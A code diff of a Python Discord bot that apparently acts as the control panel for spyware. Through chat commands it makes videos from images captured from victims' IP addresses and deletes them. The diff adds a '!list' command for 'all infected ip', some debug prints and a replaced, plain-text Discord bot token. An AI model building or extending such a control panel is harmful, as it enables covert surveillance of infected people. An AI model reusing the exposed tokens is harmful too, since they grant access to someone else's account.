@@ -37,10 +37,12 @@ async def on_member_join(member):
                            f"!generate <IP> to generate a video of the IP\n"
                            f"!generate_since <IP> <second> to generate a video of the IP since the second\n"
                            f"!delete <IP> <second> to delete the images of the IP since the second\n"
+                           f"!list to get the list of all infected ip"
                            f"<second> is the number of seconds since 1 January 1970 (midnight UTC)")
 
 @bot.command()
 async def generate(ctx, ip):
+    print("total")
     channel = bot.get_channel(ID_CANAL)
     try:
         await channel.send(f"Generating video for IP: {ip}")
@@ -52,6 +54,7 @@ async def generate(ctx, ip):
 
 @bot.command()
 async def generate_since(ctx, ip, second):
+    print("since")
     channel = bot.get_channel(ID_CANAL)
     try:
         await channel.send(f"Generating video for IP: {ip} since {second}")
@@ -72,8 +75,16 @@ async def delete(ctx, ip, second):
     except Exception as e:
         await channel.send(f"An error occurred: {str(e)}")
 
-bot.run("MTM1ODEzNjM1MjgxMzg3OTUzNw.GxtJS_.8IAQ3q9J_SwkGHg-u_-b2NKIwgUq8lEagOFijo")  # Remplace par ton token Discord
+@bot.command
+async def list(ctx):
+    list_dir = [d for d in os.listdir(".") if os.path.isdir(os.path.join(".", d))]
+    channel = bot.get_channel(ID_CANAL)
+    to_send = [f"{i}" for i in list_dir]
+    channel.send("\n".join(to_send))
+    
+
+bot.run("MTM1ODEzNjM1MjgxMzg3OTUzNw.GMV-U4.Z5p2iIF-bEds1mXbxb0C3UYP5CU-CahLPR8qEQ")  # Remplace par ton token Discord
 
 
 
-# MTM1ODEzNjM1MjgxMzg3OTUzNw.GxtJS_.8IAQ3q9J_SwkGHg-u_-b2NKIwgUq8lEagOFijo
+# MTM1ODEzNjM1MjgxMzg3OTUzNw.GMV-U4.Z5p2iIF-bEds1mXbxb0C3UYP5CU-CahLPR8qEQ
